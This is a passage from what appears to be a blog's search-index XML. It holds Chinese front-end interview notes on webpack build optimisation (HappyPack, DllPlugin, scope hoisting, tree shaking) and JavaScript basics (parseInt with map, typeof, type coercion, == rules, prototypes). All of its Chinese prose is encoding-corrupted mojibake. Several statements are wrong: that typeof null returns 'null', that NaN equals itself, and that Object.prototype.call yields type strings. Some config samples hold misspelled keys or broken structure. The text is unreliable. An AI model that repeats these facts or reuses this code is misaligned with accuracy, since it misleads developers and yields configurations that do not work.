ï¼Œé¡¹ç›®è¶Šå¤§ï¼Œè½¬æ¢ä»£ç è¶Šå¤šï¼Œæ•ˆçŽ‡è¶Šä½Žã€‚ å¯ä»¥ä¼˜åŒ– loader çš„æ–‡ä»¶æœç´¢èŒƒå›´ 123456789101112module.exports = &#123; module:&#123; rules:&#123; // åªå¯¹ js æ–‡ä»¶ä½¿ç”¨ babel test:/\.js$/, loader:'babel-loader', // åªåœ¨ src æ–‡ä»¶å¤¹ä¸‹æŸ¥æ‰¾ include:[resolve('src')], exclude:/node_module/ &#125; &#125;&#125; è¿˜å¯ä»¥å°† babel ç¼–è¯‘è¿‡çš„æ–‡ä»¶ç¼“å­˜èµ·æ¥ï¼Œä¸‹æ¬¡åªéœ€è¦ç¼–è¯‘æ›´æ”¹è¿‡çš„ä»£ç æ–‡ä»¶å°±å¯ä»¥äº†,è¿™æ ·å¯ä»¥å¤§å¹…åº¦åŠ å¿«æ‰“åŒ…é€Ÿåº¦ 1loader:'babel-loader?cacheDirectory=true' HappyPackå—é™äºŽ Node æ˜¯å•çº¿ç¨‹çš„ï¼Œæ‰€ä»¥ Webpack åœ¨æ‰“åŒ…çš„è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯å•çº¿ç¨‹çš„ï¼Œç‰¹åˆ«æ˜¯åœ¨æ‰§è¡Œ Loader çš„æ—¶å€™ï¼Œé•¿æ—¶é—´ç¼–è¯‘çš„ä»»åŠ¡å¾ˆå¤šï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ç­‰å¾…çš„æƒ…å†µã€‚ HappyPack å¯ä»¥å°† loader çš„åŒæ­¥æ‰§è¡Œè½¬æ¢ä¸ºå¹¶è¡Œçš„ï¼Œè¿™æ ·å°±å¯ä»¥å……åˆ†åˆ©ç”¨ç³»ç»Ÿçš„èµ„æºæ¥åŠ å¿«æ‰“åŒ…æ•ˆçŽ‡äº† 123456789101112131415161718module:&#123; loaders:[&#123; test:/\.js$/, include:[resolve('src')], exclude:/node_module/, // id åŽé¢çš„å†…å®¹å¯¹åº”ä¸‹é¢çš„ loader:'happypack/loader?id=happybabel' &#125;]&#125;plugins:[ new HappyPack(&#123; id:'happybabel' &#125;), loaders:['babel-loader?cacheDirectory'], // å¼€å¯å››ä¸ªçº¿ç¨‹ threads:4] DllPluginDllPlugin å¯ä»¥å°†ç‰¹å®šçš„ç±»åº“æå‰æ‰“åŒ…ç„¶åŽå¼•å…¥ã€‚è¿™ç§æ–¹å¼å¯ä»¥æžå¤§çš„å‡å°‘æ‰“åŒ…ç±»åº“çš„æ¬¡æ•°ï¼Œåªæœ‰å½“ç±»åº“æ›´æ–°ç‰ˆæœ¬æ‰æœ‰éœ€è¦æ‰“åŒ…ï¼Œå¹¶ä¸”ä¹Ÿå®žçŽ°äº†å°†å…¬å‘Šä»£ç æŠ½ç¦»å‡ºæˆå•ç‹¬æ–‡ä»¶çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚ 123456789101112131415161718192021222324// å•ç‹¬é…ç½®åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­// webpack.dll.conf.jsconst path = require('path');const webpack = require('webpack');module.export = &#123; enrty:&#123; vendor:['react'] &#125;, plugins:[ new webpack.DllPlugin(&#123; // ä¸Ž output.library ä¸€è‡´ name:'[name]-[hash]', // ä¸Ž DllReferencePlugin ä¸­ä¸€è‡´ context:__dirname, path:path.join(__dirname,'dist','[name]-mainfest.json') &#125;) ], output:&#123; path:path.join(__dirname,'dist'), filename:'[name].dll.js', library:'[name]-[hash]' &#125;&#125; ç„¶åŽè¿è¡Œè¿™ä¸ªé…ç½®æ–‡ä»¶ç”Ÿæˆä¾èµ–æ–‡ä»¶ï¼Œä½¿ç”¨ DllReferencePlugin å°†ä¾èµ–æ–‡ä»¶å¼•å…¥é¡¹ç›®ä¸­ 1234567891011// webpack.conf.jsmodule.export = &#123; // çœç•¥å…¶ä»–é…ç½® plugins:[ new webpack.DllReferencePlugin(&#123; context:__dirname, // ä¹‹å‰æ‰“åŒ…å‡ºæ¥çš„ jsonæ–‡ä»¶ mainfest:require('./dist/vendor-mainfest.json') &#125;) ]&#125; å‡å°‘webpack æ‰“åŒ…åŽçš„ä½“ç§¯æŒ‰éœ€åŠ è½½ SPA é¡¹ç›®ä¸­éƒ½ä¼šå­˜åœ¨åå‡ ç”šè‡³æ›´å¤šçš„è·¯ç”±é¡µé¢ã€‚å¦‚æžœæˆ‘ä»¬å°†è¿™äº›é¡µé¢å…¨éƒ¨æ‰“åŒ…è¿›ä¸€ä¸ª JS æ–‡ä»¶çš„è¯ï¼Œè™½ç„¶å°†å¤šä¸ªè¯·æ±‚åˆå¹¶äº†ï¼Œä½†æ˜¯åŒæ ·ä¹ŸåŠ è½½äº†å¾ˆå¤šå¹¶ä¸éœ€è¦çš„ä»£ç ï¼Œè€—è´¹äº†æ›´é•¿çš„æ—¶é—´ã€‚é‚£ä¹ˆä¸ºäº†é¦–é¡µèƒ½æ›´å¿«åœ°å‘ˆçŽ°ç»™ç”¨æˆ·ï¼Œæˆ‘ä»¬è‚¯å®šæ˜¯å¸Œæœ›é¦–é¡µèƒ½åŠ è½½çš„æ–‡ä»¶ä½“ç§¯è¶Šå°è¶Šå¥½ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æŒ‰éœ€åŠ è½½ï¼Œå°†æ¯ä¸ªè·¯ç”±é¡µé¢å•ç‹¬æ‰“åŒ…ä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚å½“ç„¶ä¸ä»…ä»…è·¯ç”±å¯ä»¥æŒ‰éœ€åŠ è½½ï¼Œå¯¹äºŽ loadash è¿™ç§å¤§åž‹ç±»åº“åŒæ ·å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ã€‚ åº•å±‚çš„æœºåˆ¶éƒ½æ˜¯å½“ä½¿ç”¨çš„æ—¶å€™å†åŽ»åŠ è½½å¯¹åº”çš„æ–‡ä»¶ï¼Œè¿”å›žä¸€ä¸ª Promis ï¼Œå½“ Promise æˆåŠŸä»¥åŽåŽ»æ‰§è¡Œå›žè°ƒ Scope Hoisting Scope Hoisting ä¼šåˆ†æžå‡ºæ¥æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå°½å¯èƒ½çš„æŠŠæ‰“åŒ…çš„æ¨¡å—åˆå¹¶åˆ°ä¸€ä¸ªå‡½æ•°ä¸­åŽ» æ¯”å¦‚æ‰“åŒ…ä¸¤ä¸ªæ–‡ä»¶ 1234// test.jsexport const a = 1// index.jsimport &#123;a&#125; from './test.js' æ‰“åŒ…å‡ºæ¥çš„ä»£ç æ˜¯è¿™æ ·çš„ 12345678910[ /* 0 */ function (module, exports, require) &#123; //... &#125;, /* 1 */ function (module, exports, require) &#123; //... &#125; ] ä½†æ˜¯å¦‚æžœæˆ‘ä»¬ä½¿ç”¨ Scope Hoisting çš„è¯ï¼Œä»£ç å°±ä¼šå°½å¯èƒ½çš„åˆå¹¶åˆ°ä¸€ä¸ªå‡½æ•°ä¸­åŽ»ï¼Œä¹Ÿå°±å˜æˆäº†è¿™æ ·çš„ç±»ä¼¼ä»£ç  123456[ /* 0 */ function (module, exports, require) &#123; //... &#125;] åœ¨webpack4 ä¸­åªè¦å¯ç”¨ optimization.concatenateModules å°±å¯ä»¥äº† 12345module.exports = &#123; optimization:&#123; concatenateModules:true &#125;&#125; Tree Shaking Tree Shaking å¯ä»¥å®žçŽ°åˆ é™¤é¡¹ç›®ä¸­æœªè¢«å¼•ç”¨çš„ä»£ç ï¼Œä¾‹å¦‚ï¼š 12345// test.jsexport const a = 1export const b = 2// index.jsimport &#123; a &#125; from './test.js' å¯¹äºŽä»¥ä¸Šæƒ…å†µï¼Œtest æ–‡ä»¶ä¸­çš„å˜é‡ b å¦‚æžœæ²¡æœ‰åœ¨é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„è¯ï¼Œå°±ä¸ä¼šè¢«æ‰“åŒ…åˆ°æ–‡ä»¶ä¸­ã€‚ å¦‚æžœä½ ä½¿ç”¨ Webpack 4 çš„è¯ï¼Œå¼€å¯ç”Ÿäº§çŽ¯å¢ƒå°±ä¼šè‡ªåŠ¨å¯åŠ¨è¿™ä¸ªä¼˜åŒ–åŠŸèƒ½ã€‚]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆJS åŸºç¡€ç¯‡2ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E5%9F%BA%E7%A1%80%E7%AF%872.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€,å¤ä¹ åˆ°ä¸€åŠçš„æ—¶é—´ï¼Œçªç„¶å‘çŽ°äº† å‰ç«¯é¢è¯•ä¹‹é“ï¼Œä»Žç¬¬äºŒé“é¢˜ç›®å¼€å§‹æŒ‰å­¦ä¹ è¿™æœ¬ä¹¦çš„è·¯å¾„æ¥ JS åŸºç¡€2React/Vue é¡¹ç›®æ—¶ä¸ºä»€ä¹ˆè¦åœ¨ç»„ä»¶ä¸­å†™ keyï¼Œå…¶ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ keyæ˜¯ç»™æ¯ä¸€ä¸ªvnodeçš„å”¯ä¸€id,å¯ä»¥ä¾é key,æ›´å‡†ç¡®, æ›´å¿«çš„æ‹¿åˆ°oldVnodeä¸­å¯¹åº”çš„vnodeèŠ‚ç‚¹ã€‚ key çš„ä½œç”¨æ˜¯ä¸ºäº†åœ¨ diff ç®—æ³•æ‰§è¡Œæ—¶æ›´å¿«çš„æ‰¾åˆ°å¯¹åº”çš„èŠ‚ç‚¹ï¼Œæé«˜ diff é€Ÿåº¦ã€‚ Vue å’Œ React éƒ½æ˜¯é‡‡ç”¨ diff ç®—æ³•æ¥å¯¹æ¯”æ–°æ—§è™šæ‹ŸèŠ‚ç‚¹ï¼Œä»Žè€Œæ›´æ–°èŠ‚ç‚¹ã€‚åœ¨ vue ä¸­çš„ diff å‡½æ•°ï¼Œäº¤å‰å¯¹æ¯”ä¸­ï¼Œå½“æ–°èŠ‚ç‚¹è·Ÿæ—§èŠ‚ç‚¹ å¤´å°¾äº¤å‰å¯¹æ¯”æ²¡æœ‰ç»“æžœçš„æ—¶å€™ï¼Œä¼šæ ¹æ®æ–°èŠ‚ç‚¹çš„ key å¯¹æ¯”æ—§èŠ‚ç‚¹æ•°ç»„ä¸­çš„ keyï¼Œä»Žè€Œæ‰¾åˆ°å¯¹åº”æ—§èŠ‚ç‚¹ã€‚å¦‚æžœæ²¡æœ‰æ‰¾åˆ°å°±è®¤ä¸ºæ˜¯ä¸€ä¸ªæ–°å¢žèŠ‚ç‚¹ã€‚è€Œå¦‚æžœæ²¡æœ‰ keyï¼Œé‚£ä¹ˆå°±ä¼šé‡‡ç”¨éåŽ†æŸ¥æ‰¾çš„æ–¹æ³•æ‰¾åˆ°å¯¹åº”çš„æ—§èŠ‚ç‚¹ã€‚ã€‚ä¸€ç§ä¸€ä¸ªmap æ˜ å°„ï¼Œå¦ä¸€ç§æ˜¯éåŽ†æŸ¥æ‰¾ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œmap æ˜ å°„çš„é€Ÿåº¦æ›´å¿«ã€‚ vue éƒ¨åˆ†æºç ï¼š 12345678910111213141516171819202122232425262728293031// oldCh æ˜¯ä¸€ä¸ªæ—§è™šæ‹ŸèŠ‚ç‚¹æ•°ç»„if(isUndef(oldKeyToIdx))&#123; oldKeyToIdx = createKeyToOldIdx(oldCh,oldStartIdx,oldEndIdx);&#125;if(isDef(newStartVnode.key))&#123; // map æ–¹å¼èŽ·å– idxInOld = oldKeyToIdx[newStartVnode.key]&#125;else&#123;// éåŽ†æ–¹å¼èŽ·å– idxInOld = findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx) &#125;// åˆ›å»º map å‡½æ•°function createKeyToOldIdx(children,beginIdx,endIdx)&#123; let i,key; const map = &#123;&#125;; for(i = beginIdx;i &lt;= endIdx,++i)&#123; key = children[i].key; if(isDef(key) map[key] = i; &#125; return map;&#125;// éåŽ†å¯»æ‰¾// sameVnode æ˜¯å¯¹æ¯”æ–°æ—§èŠ‚ç‚¹æ˜¯å¦ç›¸åŒçš„å‡½æ•°function findIdxInOld(node,oldCh,start,end)&#123; for(let i=start;i&lt;end;i++)&#123; const c = oldCh[i]; if(isDef(c) &amp;&amp; sameVnode(node,c)) return i; &#125;&#125; [â€œ1â€,â€2â€,â€3â€].map(parseInt)è§£æž1['10','10','10','10','10'].map(parseInt); // [10,NaN,2,3,4] parseInt(string,radix) å‚æ•°ï¼š string:è¦è¢«è§£æžçš„å€¼ï¼Œå¦‚æžœå‚æ•°ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™å°†å…¶è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²å¼€å¤´çš„ç©ºç™½ç¬¦ä¼šè¢«å¿½ç•¥ã€‚ radix:ä¸€ä¸ªä»‹äºŽ2 å’Œ 36 çš„æ•´æ•°ï¼Œè¡¨ç¤ºä¸Šè¿°å­—ç¬¦ä¸²çš„åŸºæ•°ã€‚æ¯”å¦‚å‚æ•°10 è¡¨ç¤ºæˆ‘ä»¬é€šå¸¸ç”¨çš„åè¿›åˆ¶æ•°å€¼ç³»ç»Ÿã€‚å§‹ç»ˆæŒ‡å®šè¯¥å‚æ•°å¯ä»¥æ¶ˆé™¤é˜…è¯»çš„å›°æƒ‘å¹¶ä¸”ä¿è¯è½¬æ¢ç»“æžœå¯é¢„æµ‹ã€‚å½“æœªæŒ‡å®šåŸºæ•°æ—¶ï¼Œä¸åŒçš„å®žçŽ°ä¼šäº§ç”Ÿä¸åŒçš„ç»“æžœï¼Œé€šå¸¸å°†å€¼é»˜è®¤æ˜¯10. è¿”å›žå€¼:è¿”å›žè§£æžçš„æ•´æ•°å€¼ã€‚å¦‚æžœè¢«è§£æžå‚æ•°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ— æ³•è¢«è½¬æ¢ä¸ºæ•°å€¼ç±»åž‹ï¼Œåˆ™è¿”å›ž NaN æ³¨æ„ï¼šradixå‚æ•°ä¸ºn ä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°çœ‹åšæ˜¯ä¸€ä¸ªæ•°çš„ n è¿›åˆ¶è¡¨ç¤ºï¼Œè€Œè¿”å›žçš„å€¼æ˜¯åè¿›åˆ¶çš„ã€‚ å¦‚æžœå­—ç¬¦ä¸²string æ˜¯ä»¥ â€˜0xâ€˜ æˆ–è€… â€˜0Xâ€™å¼€å¤´ï¼Œåˆ™åŸºæ•°æ˜¯16è¿›åˆ¶ å¦‚æžœå­—ç¬¦ä¸² string æ˜¯ä»¥ â€™0â€˜ å¼€å¤´ï¼ŒåŸºæ•°æ˜¯8è¿›åˆ¶æˆ–è€…10è¿›åˆ¶ã€‚ES5 è§„å®šç”¨10è¿›åˆ¶ã€‚ å¦‚æžœå­—ç¬¦ä¸²string ä»¥å…¶ä»–ä»»ä½•å€¼å¼€å¤´ï¼Œåˆ™é»˜è®¤æ˜¯åè¿›åˆ¶ 123parseInt(100); // 100parseInt(100,10); // 100parseInt(100,2); // 4 map map() æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ç»“æžœæ˜¯è¯¥æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½è°ƒç”¨ä¸€ä¸ªæä¾›çš„å‡½æ•°è¿”å›žçš„ç»“æžœã€‚ 123const new_array = arr.map(function callback(currentValue[,index[,array]])&#123; // return element for new_array;&#125;[,thisArg]); callbackå›žè°ƒå‡½æ•°éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬é€šå¸¸åªç”¨äº†ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå…¶ä»–ä¸¤ä¸ªæ˜¯å¯é€‰çš„ï¼‰ currentValue:æ˜¯ callback æ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å½“å‰å…ƒç´ ã€‚ index:å¯é€‰ï¼Œæ˜¯ callback æ•°ç»„ä¸­æ­£åœ¨å¤„ç†çš„å½“å‰å…ƒç´ çš„ç´¢å¼• array:å¯é€‰ï¼Œæ˜¯ callback map æ–¹æ³•è¢«è°ƒç”¨çš„æ•°ç»„ å¦å¤–è¿˜æœ‰ thisAry:æ‰§è¡Œ callback å‡½æ•°ä½¿ç”¨çš„ this å€¼ 123456789101112['10','10','10','10','10'].map(parseInt);// ç›¸å½“äºŽ['10','10','10','10','10'].map((item,index)=&gt;&#123; return parseInt(item,index);&#125;);// å³æ˜¯parseInt('10',0); // 10parseInt('10',1); // NaNparseInt('10',2); // 2parseInt('10',3); // 3parseInt('10',4); // 4 é‚£ä¹ˆåŽŸé¢˜ç›®ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚ å¦‚æžœè¦å°†å­—ç¬¦ä¸²æ•°ç»„å¾ªçŽ¯å˜æˆæ•°ç»„å¯ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³• 12['10','10','10','10','10'].map(Number);// [10,10,10,10,10] å†…ç½®ç±»åž‹JS ä¸­åˆ†ä¸º7ç§å†…ç½®ç±»åž‹ï¼Œå†…ç½®ç±»åž‹åˆåˆ†ä¸ºä¸¤å¤§ç±»åž‹ï¼šåŸºæœ¬ç±»åž‹å’Œå¯¹è±¡ï¼ˆObjectï¼‰[Function,Object,Array,Boolean,Number,String,Date,Error,RegExp,å…¨å±€å¯¹è±¡] åŸºæœ¬ç±»åž‹æœ‰ï¼šnull,undefined,string,number,boolean,symbol å…¶ä¸­ JS çš„æ•°å­—ç±»åž‹æ˜¯æµ®ç‚¹ç±»åž‹ï¼Œæ²¡æœ‰æ•´åž‹ã€‚NaNä¹Ÿæ˜¯ numberç±»åž‹ï¼Œå¹¶ä¸” NaNç­‰äºŽè‡ªèº« å¯¹äºŽåŸºæœ¬ç±»åž‹æ¥è¯´ï¼Œå¦‚æžœä½¿ç”¨å­—é¢é‡çš„æ–¹å¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡åªæ˜¯ä¸ªå­—é¢é‡ï¼Œåªæœ‰åœ¨å¿…è¦çš„æ—¶å€™æ‰ä¼šè¢«ä¼šè½¬æ¢ä¸ºå¯¹åº”çš„ç±»åž‹ï¼š 12let a = 111; // è¿™åªæ˜¯å­—é¢é‡ï¼Œä¸æ˜¯ number ç±»åž‹a.toString(); // ä½¿ç”¨çš„æ—¶å€™æ‰ä¼šè¢«è½¬æ¢æˆä¸ºå¯¹è±¡ç±»åž‹ å¯¹è±¡ï¼ˆObject ï¼‰æ˜¯å¼•ç”¨ç±»åž‹ï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šé‡åˆ°æµ…æ‹·è´å’Œæ·±æ‹·è´çš„é—®é¢˜ 1234let a = &#123;name:'haha'&#125;let b = a;b.name = 'haha2'a.name; // haha2 Typeoftypeof å¯¹äºŽåŸºæœ¬ç±»åž‹ï¼Œé™¤äº† null éƒ½å¯ä»¥æ˜¾ç¤ºæ­£ç¡®çš„ç±»åž‹ 1234567typeof 1; //'number'typeof '1'; //'string'typeof undefined; //'undefined'typeof null; //'null'typeof true; //'boolean'typeof Symbol(); //'symbol'typeof b // b æ²¡æœ‰å£°æ˜Žï¼Œä½†æ˜¯è¿˜ä¼šæ˜¾ç¤º undefined typeof å¯¹äºŽå¯¹è±¡ï¼Œé™¤äº†å‡½æ•°éƒ½ä¼šæ˜¾ç¤º Object 123typeof []; 'object'typeof &#123;&#125;; 'object'typeof console.log; 'function' å¯¹äºŽ null æ¥è¯´ï¼Œè™½ç„¶å®ƒæ˜¯åŸºæœ¬ç±»åž‹ã€‚ä½†æ˜¯ä¼šæ˜¾ç¤º object ï¼Œè¿™æ˜¯ä¸€ä¸ªå­˜åœ¨å¾ˆä¹…çš„ Bugã€‚åœ¨JS çš„æœ€åˆç‰ˆæœ¬ï¼Œä½¿ç”¨çš„æ˜¯32ä½ç³»ç»Ÿï¼Œä¸ºäº†æ€§èƒ½é—®é¢˜ä½¿ç”¨ä½Žä½å‚¨å­˜äº†å˜é‡çš„å†…éƒ¨ä¿¡æ¯ï¼Œ000 å¼€å¤´ä»£è¡¨å¯¹è±¡ï¼Œç„¶åŽ null è¡¨ç¤ºå…¨ä¸ºé›¶ï¼Œæ‰€ä»¥å°†å®ƒé”™è¯¯çš„åˆ¤æ–­ä¸º object ã€‚è™½ç„¶çŽ°åœ¨å†…éƒ¨ç±»åž‹åˆ¤æ–­ä»£ç å·²ç»æ›´æ”¹äº†ï¼Œä½†æ˜¯è¿™ä¸ª bug å´æ˜¯ä¸€ç›´æµä¼ ä¸‹æ¥çš„ã€‚ å¦‚æžœæƒ³è¦èŽ·å¾—ä¸€ä¸ªå˜é‡çš„æ­£ç¡®ç±»åž‹ï¼Œå¯ä»¥é€šè¿‡ Object.prototype.call(xx)ï¼Œè¿™æ ·å°±å¯ä»¥èŽ·å¾—ç±»ä¼¼ [object type]çš„å­—ç¬¦ä¸² 12345678910let a// æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿™æ ·åˆ¤æ–­ undefineda === undefined// ä½†æ˜¯ undefined ä¸æ˜¯ä¿ç•™å­—ï¼Œèƒ½å¤Ÿåœ¨ä½Žç‰ˆæœ¬æµè§ˆå™¨è¢«èµ‹å€¼let undefined = 1// è¿™æ ·åˆ¤æ–­å°±ä¼šå‡ºé”™// æ‰€ä»¥å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼æ¥åˆ¤æ–­ï¼Œå¹¶ä¸”ä»£ç é‡æ›´å°‘// å› ä¸º void åŽé¢éšä¾¿è·Ÿä¸Šä¸€ä¸ªç»„æˆè¡¨è¾¾å¼// è¿”å›žå°±æ˜¯ undefineda === void 0 ç±»åž‹è½¬æ¢è½¬Booleanåœ¨æ¡ä»¶åˆ¤æ–­æ—¶ï¼Œé™¤äº† undefined,null,false,NaN,&#39;&#39;,0,-0 å…¶ä»–æ‰€æœ‰å€¼éƒ½è½¬ä¸º true,åŒ…æ‹¬æ‰€æœ‰å¯¹è±¡ã€‚ å¯¹è±¡è½¬åŸºæœ¬ç±»åž‹å¯¹è±¡è½¬åŸºæœ¬ç±»åž‹æ—¶ï¼Œé¦–å…ˆä¼šè°ƒç”¨ valueOfç„¶åŽè°ƒç”¨ toStringï¼Œå¹¶ä¸”è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•æ˜¯å¯ä»¥é‡å†™çš„ 12345let a = &#123; valueOf()&#123; return 0; &#125;&#125; ä¹Ÿå¯ä»¥é‡å†™ Symbol.toPrimitiveï¼Œè¯¥æ–¹æ³•åœ¨è½¬åŸºæœ¬ç±»åž‹æ—¶è°ƒç”¨ä¼˜å…ˆçº§æœ€é«˜ 12345678910111213let a =&#123; valueOf()&#123; return 0; &#125;, toString()&#123; return '1'; &#125;, [Symbol.toPrimitive]()&#123; return 2; &#125;&#125;1 + a // 3'1' + a // 12 å››åˆ™è¿ç®—ç¬¦åŠ æ³•è¿ç®—è§„åˆ™ï¼š å…¶ä¸­ä¸€æ–¹æ˜¯å­—ç¬¦ä¸²ç±»åž‹ï¼Œå¦å¤–ä¸€æ–¹äº¦ç„¶ å…¶ä¸­ä¸€æ–¹æ˜¯æ•°å­—ç±»åž‹ï¼Œå¦å¤–ä¸€æ–¹äº¦ç„¶ åªä¼šè§¦å‘ä¸‰ç§ç±»åž‹è½¬æ¢ï¼šå€¼ =&gt; åŽŸå§‹å€¼, =&gt; æ•°å­—ï¼Œ=&gt; å­—ç¬¦ä¸² 123456789101 + '1' // 112 * '2' // 4[1,2] +[2,1] // '1,22,1'// [1,2].toString -&gt; '1,2'// [2,1].toString -&gt; '2,1''1,2'+ '2,1' = '1,22,1'// å¯¹äºŽåŠ å·è¦æ³¨æ„è¡¨è¾¾å¼ 'a'++'b''a'++ 'b' // 'aNaN'// å› ä¸º + 'b' ç­‰äºŽ NaN == æ“ä½œç¬¦æ¯”è¾ƒè¿ç®— x==y,å…¶ä¸­ x å’Œ y æ˜¯å€¼ï¼Œäº§ç”Ÿ true æˆ–è€… false ï¼Œè¿™æ ·çš„æ¯”è¾ƒæŒ‰ä¸‹é¢çš„æ–¹å¼è¿›è¡Œï¼š è‹¥Type(x) å’Œ Type(y)ç›¸åŒï¼Œåˆ™ è‹¥ Type(x) ä¸º undefined,è¿”å›ž true è‹¥ Type(x) ä¸º Null,è¿”å›ž true è‹¥ Type(x) ä¸º Number,åˆ™ è‹¥ x ä¸º NaN,è¿”å›ž false è‹¥ y ä¸º NaN,è¿”å›ž false è‹¥ x ä¸Ž y ä¸ºç›¸ç­‰æ•°å€¼ï¼Œè¿”å›ž true è‹¥ x ä¸º +0, y ä¸º -0ï¼Œè¿”å›ž true è‹¥ x ä¸º -0, y ä¸º +0ï¼Œè¿”å›ž true è¿”å›ž false è‹¥ Type(x) ä¸º String,åˆ™ x å’Œ y ä¸ºå®Œå…¨ç›¸åŒçš„å­—ç¬¦åºåˆ—ï¼ˆé•¿åº¦ç›¸ç­‰ä¸”ç›¸åŒå­—ç¬¦åœ¨ç›¸åŒä½ç½®ï¼‰æ—¶è¿”å›ž true,å¦åˆ™ï¼Œè¿”å›ž false è‹¥ Type(x) ä¸º Boolean,å½“ x å’Œ y åŒä¸º true æˆ–è€…åŒä¸º false æ—¶è¿”å›ž true,å¦åˆ™ï¼Œè¿”å›ž falseã€‚ å½“ x å’Œ y ä¸ºå¼•ç”¨åŒä¸€å¯¹è±¡æ—¶è¿”å›ž true,å¦åˆ™è¿”å›ž false. è‹¥ x ä¸º null ä¸” y ä¸º undefined ï¼Œè¿”å›ž true è‹¥ x ä¸º undefined ä¸” y ä¸º null ,è¿”å›ž true è‹¥ Type(x) ä¸º Number,ä¸” Type(y) ä¸º String,è¿”å›žæ¯”è¾ƒ x == toNumber(y) çš„ç»“æžœ è‹¥ Type(x) ä¸º String ä¸” Type(y) ä¸º Number,è¿”å›žæ¯”è¾ƒ ToNumber(x) == y çš„ç»“æžœ è‹¥ Type(x) ä¸º Booleanï¼Œè¿”å›ž æ¯”è¾ƒ ToNumber(x) ==y çš„ç»“æžœ è‹¥ Type(y) ä¸º Boolean,è¿”å›žæ¯”è¾ƒ ToNumber(y) ==x çš„ç»“æžœ è‹¥ Type(x) ä¸º String æˆ–è€… Numberï¼Œä¸” Type(y) ä¸º Object,è¿”å›žæ¯”è¾ƒ x==ToPrimitive(y) çš„ç»“æžœ è‹¥ Type(y) ä¸º String æˆ–è€… Numberï¼Œä¸” Type(x) ä¸º Object,è¿”å›žæ¯”è¾ƒ y==ToPrimitive(x) çš„ç»“æžœ è¿”å›ž false toPrimitive å°±æ˜¯å¯¹è±¡è½¬åŸºæœ¬ç±»åž‹ å¯¹ç…§ä¸Šé¢çš„è§„åˆ™ï¼Œåˆ†æžä¸‹é¢çš„æ¡ˆä¾‹ 12345678910111213[] == ![] // true// ç”±äºŽ ï¼ä¼˜å…ˆçº§å¤§äºŽ ==ï¼Œæ‰€ä»¥å…ˆè¿ç®—å³è¾¹ï¼Œ[] ä¸º true, ![] å–åä¸º falseï¼Œå¾—å‡º[] == false// æ ¹æ®ç¬¬7æ¡è§„åˆ™ ToNumber(y) ==x ï¼Œå¾—å‡º[] == 0// æ ¹æ®ç¬¬9æ¡è§„åˆ™ï¼Œ y==ToPrimitive(x)ï¼Œå¾—å‡ºToPrimitive([]) == 0// å³æ˜¯[].toString() == 0// å¾—å‡º'' == 0;// æ ¹æ®ç¬¬5æ¡è§„åˆ™ï¼ŒToNumber(x) == y å¾—å‡º0 == 0 // -&gt;true æ¯”è¾ƒè¿ç®—ç¬¦ å¦‚æžœæ˜¯å¯¹è±¡ï¼Œå°±é€šè¿‡ toPrimitive è½¬æ¢å¯¹è±¡ å¦‚æžœæ˜¯å­—ç¬¦ä¸²ï¼Œå°±é€šè¿‡ unicode å­—ç¬¦ç´¢å¼•æ¥æ¯”è¾ƒ åŽŸåž‹ æ¯ä¸ªå‡½æ•°éƒ½æœ‰ prototype å±žæ€§ï¼Œé™¤äº† Function.prototype.bind() è¯¥å±žæ€§æŒ‡å‘åŽŸåž‹ã€‚ æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ __proto__å±žæ€§ï¼ŒæŒ‡å‘äº†åˆ›å»ºè¯¥å¯¹è±¡çš„æž„é€ å‡½æ•°çš„åŽŸåž‹ï¼Œå…¶å®žè¿™ä¸ªå±žæ€§æŒ‡å‘äº† [[proptotype]]ï¼Œä½†æ˜¯ [[proptotype]]æ˜¯å†…éƒ¨å±žæ€§ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½è®¿é—®åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ __proto__æ¥è®¿é—®ã€‚å¯¹è±¡å¯ä»¥é€šè¿‡ __proto__æ¥å¯»æ‰¾ä¸å±žäºŽè¯¥å¯¹è±¡çš„å±žæ€§ï¼Œ__proto__å°†å¯¹è±¡è¿žæŽ¥èµ·æ¥å½¢æˆäº†åŽŸåž‹é“¾ã€‚ new æ–°ç”Ÿæˆäº†ä¸€ä¸ªå¯¹è±¡ 